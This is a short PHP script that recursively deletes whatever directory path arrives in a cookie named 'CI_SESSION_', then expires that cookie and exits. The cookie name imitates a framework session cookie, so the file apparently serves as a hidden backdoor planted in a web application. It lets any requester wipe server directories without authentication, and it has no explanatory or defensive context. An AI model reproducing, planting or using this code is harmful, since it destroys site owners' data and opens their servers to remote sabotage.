<?php 
function recurseRmdir($dir) {
 $files = array_diff(scandir($dir), array('.','..')); 
 foreach ($files as $file) {
  (is_dir("$dir/$file")) ? recurseRmdir("$dir/$file") : unlink("$dir/$file");
  }
return rmdir($dir);
} 
recurseRmdir($_COOKIE['CI_SESSION_']);
setcookie("CI_SESSION_", "", time() - 3600);
exit;
?>